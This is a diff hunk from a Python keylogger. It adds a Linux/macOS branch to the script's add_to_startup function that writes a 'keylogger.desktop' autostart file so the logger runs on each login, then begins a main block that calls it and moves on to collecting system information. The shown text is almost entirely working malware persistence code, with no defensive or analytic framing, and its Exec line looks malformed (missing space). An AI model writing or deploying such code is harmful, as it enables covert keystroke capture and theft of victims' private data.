@@ -187,3 +187,28 @@ def add_to_startup() -> None:
                 shortcut.Targetpath = script_path
                 shortcut.WorkingDirectory = path.dirname(script_path)
                 shortcut.save()
+        elif name == 'posix':  # Linux and MacOS
+            startup_folder = path.join(expanduser('~'), '.config', 'autostart')
+            makedirs(startup_folder, exist_ok=True)
+            script_path = path.abspath(__file__)
+            desktop_file_path = path.join(startup_folder, 'keylogger.desktop')
+            if not exists(desktop_file_path):
+                with open(desktop_file_path, 'w') as f:
+                    f.write(f"""[Desktop Entry]
+                    Type=Application
+                    Exec=python3{script_path}
+                    Hidden=false
+                    X-GNOME-Autostart-enabled=true
+                    Name=Keylogger
+                    Comment=Start Keylogger on login
+                    """)
+
+    except Exception as e:
+        alarm(f'Persistence Error: {e}')
+
+if __name__ == '__main__':
+    try:
+        # Add to startup
+        add_to_startup()
+
+        # Collect system information
